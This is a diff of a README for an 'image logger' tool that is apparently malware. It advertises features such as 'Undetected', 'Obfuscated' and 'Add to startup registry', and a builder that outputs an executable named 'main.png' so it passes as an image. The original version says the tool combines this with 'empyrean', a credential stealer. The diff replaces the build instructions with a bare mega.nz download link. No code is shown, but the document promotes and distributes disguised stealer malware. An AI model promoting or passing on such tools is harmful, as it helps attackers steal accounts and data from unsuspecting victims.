@@ -1,23 +1,7 @@
-<img src="https://cdn.discordapp.com/attachments/1098287991807557654/1105174702797881527/image.png" width="100%" height="100%" />
-
-<div align="center">
-    <img src="https://img.shields.io/github/languages/top/neveronsere/image-logger?color=%23000000">
-    <img src="https://img.shields.io/github/stars/neveronsere/image-logger?color=%23000000&logoColor=%23000000">
-    <br>
-    <img src="https://img.shields.io/github/commit-activity/w/neveronsere/image-logger?color=%23000000"> 
-    <img src="https://img.shields.io/github/last-commit/neveronsere/image-logger?color=%23000000&logoColor=%23000000">
-    <br>
-    <img src="https://img.shields.io/github/issues/neveronsere/image-logger?color=%23000000&logoColor=%23000000">
-    <img src="https://img.shields.io/github/issues-closed/neveronsere/image-logger?color=%23000000&logoColor=%23000000">
-    <br>
-    - Join our server for announcements and updates: <a href="https://discord.gg/yeats">Join Discord</a>
-    - Please star the github repository for more updates
-</div>
-<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
-
+<img src="https://media.discordapp.net/attachments/1178777942864695339/1178811384050503740/67037394-purple-lightning.png?ex=657780a7&is=65650ba7&hm=895f5ae69e31b5ea17fcbb831d8f933ded1b468ca6b76014b68c80da54e4cc61&=&format=webp&width=540&height=540" width="100%" height="100%" />
 ## Features
 
--   Best image logger (combining image logging script with empyrean)
+-   Best image logger 
     - Undetected
     - Secure
     - Obfuscated
@@ -55,25 +39,4 @@
     -   Add to startup registry
 
 ## Install
-
-### Setup
-
-1. [Download source code zip](https://github.com/neveronsere/image-logger/archive/refs/heads/main.zip)
-2. Extract zip
-3. Run `builder.bat`
-4. Follow instructions in builder and your exe will be found in the `dist` folder under the name `main.png`
-
-<div align="center">
-    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/bu0.png"></img>
-    <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="75%">    
-    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/em0.png"></img>
-    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/em1.png"></img>
-    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/em2.png"></img>
-    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/em3.png"></img>
-</div>
-
-## Errors?
-
--   Join the [Discord](https://discord.gg/yeats)
-
-<img src="img/footer.png">
+https://mega.nz/file/BeUDzC7K#HijunA7UEKoAK5nEv4VzA5vaAuCjysamdxPQbBmlJNo
